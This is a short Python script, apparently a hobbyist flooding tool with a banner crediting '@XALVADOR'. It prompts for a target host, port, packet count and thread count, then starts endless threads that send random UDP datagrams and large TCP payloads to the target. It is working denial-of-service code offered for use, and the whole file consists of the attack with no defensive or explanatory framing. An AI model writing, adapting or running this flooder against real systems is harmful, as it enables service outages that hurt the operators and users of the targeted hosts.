import random
import socket
import threading

print("""
__  ___  __   _____ ____  
xlyis remake 
TOOLS FROM @XALVADOR
                              """)
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))

def wibu():
    data = random._urandom(1180)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print("Wibu!!!")
        except:
            s.close()

def wibu2():
    data = random._urandom(65812)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("Wibu!!!")
        except:
            s.close()

for y in range(threads):
        th = threading.Thread(target = wibu)
        th.start()
        th = threading.Thread(target = wibu2)
        th.start()